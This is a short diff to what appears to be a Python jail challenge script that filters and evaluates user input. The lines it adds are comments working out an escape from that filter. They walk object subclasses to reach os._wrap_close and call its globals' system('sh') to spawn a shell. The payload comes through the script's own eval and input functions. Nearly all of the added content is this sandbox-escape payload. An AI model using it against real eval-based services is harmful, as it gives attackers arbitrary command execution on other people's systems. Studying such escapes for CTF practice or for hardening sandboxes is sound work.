@@ -29,3 +29,13 @@ if filter(input_data):
     print("Oh hacker!")
     exit(0)
 print('Answer: {}'.format(my_eval_func_ABDC8732(input_data)))
+
+
+# here bytes is block, so I can not use open
+# but I can use __class__ and find the object for os._wrap_close_
+# to find that I can use sysfinder tool or like below:
+# clsss = "".__class__.__base__.__subclasses__()
+# [(i, x) for i, x in enumerate(clsss) if "os" in x.__name__]
+# then I can use the my_eval_func(my_input_func)
+#  my_eval_func_ABDC8732(my_input_func_001EC9GP())
+#  ().__class__.__base__.__subclasses__()[154].__init__.__globals__['system']("sh")
